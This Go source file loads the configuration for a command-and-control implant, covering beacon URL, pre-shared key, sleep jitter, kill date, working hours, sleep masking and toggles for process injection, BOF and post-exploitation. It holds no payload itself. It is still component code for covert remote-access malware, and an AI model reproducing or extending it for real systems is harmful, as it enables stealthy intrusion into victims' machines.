package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"strconv"
	"strings"
)

// bakedConfigJSON may be injected at link time:
//
//	-ldflags "-X main.bakedConfigJSON=<json>"
var bakedConfigJSON = ""

// AgentConfig is the runtime implant configuration (I1 config blob).
type AgentConfig struct {
	URL        string  `json:"url"`
	PSK        string  `json:"psk"`
	Sleep      float64 `json:"sleep"`
	Jitter     float64 `json:"jitter"`
	KillDate   int     `json:"kill_date"`
	MaxMiss    int     `json:"max_miss"`
	WorkStart  int     `json:"work_start"`
	WorkEnd    int     `json:"work_end"`
	Channel    string  `json:"channel"` // http | ws
	WSURL      string  `json:"ws_url"`
	SleepMask  string  `json:"sleep_mask"`
	AllowInject bool   `json:"allow_inject"`
	AllowBOF    bool   `json:"allow_bof"`
	AllowPostEx bool   `json:"allow_postex"`
	Version     string `json:"version"`
}

func defaultConfig() AgentConfig {
	return AgentConfig{
		Sleep:     5,
		Jitter:    20,
		Channel:   "http",
		SleepMask: "jitter",
		Version:   "3.1.0",
	}
}

func loadConfig() (AgentConfig, error) {
	cfg := defaultConfig()

	// 1) link-time baked JSON
	if s := strings.TrimSpace(bakedConfigJSON); s != "" {
		_ = json.Unmarshal([]byte(s), &cfg)
	}

	// 2) SC5_CONFIG_B64 (standard or raw URL encoding)
	if b64 := strings.TrimSpace(os.Getenv("SC5_CONFIG_B64")); b64 != "" {
		raw, err := base64.StdEncoding.DecodeString(b64)
		if err != nil {
			raw, err = base64.RawURLEncoding.DecodeString(b64)
		}
		if err != nil {
			return cfg, fmt.Errorf("SC5_CONFIG_B64 decode: %w", err)
		}
		if err := json.Unmarshal(raw, &cfg); err != nil {
			return cfg, fmt.Errorf("SC5_CONFIG_B64 json: %w", err)
		}
	}

	// 3) env overrides (highest priority for ops flexibility)
	if v := os.Getenv("SC5_URL"); v != "" {
		cfg.URL = v
	}
	if v := os.Getenv("SC5_PSK"); v != "" {
		cfg.PSK = v
	}
	if v := os.Getenv("SC5_SLEEP"); v != "" {
		if f, err := strconv.ParseFloat(v, 64); err == nil {
			cfg.Sleep = f
		}
	}
	if v := os.Getenv("SC5_JITTER"); v != "" {
		if f, err := strconv.ParseFloat(v, 64); err == nil {
			cfg.Jitter = f
		}
	}
	if v := os.Getenv("SC5_KILL_DATE"); v != "" {
		if n, err := strconv.Atoi(v); err == nil {
			cfg.KillDate = n
		}
	}
	if v := os.Getenv("SC5_MAX_MISS"); v != "" {
		if n, err := strconv.Atoi(v); err == nil {
			cfg.MaxMiss = n
		}
	}
	if v := os.Getenv("SC5_WORK_START"); v != "" {
		if n, err := strconv.Atoi(v); err == nil {
			cfg.WorkStart = n
		}
	}
	if v := os.Getenv("SC5_WORK_END"); v != "" {
		if n, err := strconv.Atoi(v); err == nil {
			cfg.WorkEnd = n
		}
	}
	if v := os.Getenv("SC5_CHANNEL"); v != "" {
		cfg.Channel = strings.ToLower(v)
	}
	if v := os.Getenv("SC5_WS_URL"); v != "" {
		cfg.WSURL = v
	}
	if v := os.Getenv("SC5_SLEEP_MASK"); v != "" {
		cfg.SleepMask = v
	}
	if os.Getenv("SC5_ALLOW_INJECT") == "1" {
		cfg.AllowInject = true
	}
	if os.Getenv("SC5_ALLOW_BOF") == "1" {
		cfg.AllowBOF = true
	}
	if os.Getenv("SC5_ALLOW_POSTEX") == "1" {
		cfg.AllowPostEx = true
	}

	if cfg.Channel == "" {
		cfg.Channel = "http"
	}
	if cfg.Channel == "ws" && cfg.WSURL == "" && cfg.URL != "" {
		cfg.WSURL = httpToWS(cfg.URL)
	}
	if cfg.URL == "" && cfg.Channel == "http" {
		return cfg, fmt.Errorf("url required")
	}
	if cfg.Channel == "ws" && cfg.WSURL == "" {
		return cfg, fmt.Errorf("ws_url required for channel=ws")
	}
	if cfg.PSK == "" {
		return cfg, fmt.Errorf("psk required")
	}
	return cfg, nil
}

func httpToWS(u string) string {
	u = strings.TrimSpace(u)
	u = strings.Replace(u, "https://", "wss://", 1)
	u = strings.Replace(u, "http://", "ws://", 1)
	if strings.Contains(u, "/api/v1/implant/beacon") {
		return strings.Replace(u, "/api/v1/implant/beacon", "/ws/v1/beacon", 1)
	}
	// if already path-less host:port
	if !strings.Contains(u, "/ws/") {
		return strings.TrimRight(u, "/") + "/ws/v1/beacon"
	}
	return u
}

// configBlobB64 returns a standard-b64 JSON config for factory scripts.
func configBlobB64(cfg AgentConfig) string {
	// never embed PSK in returned factory note if empty placeholder
	b, _ := json.Marshal(cfg)
	return base64.StdEncoding.EncodeToString(b)
}
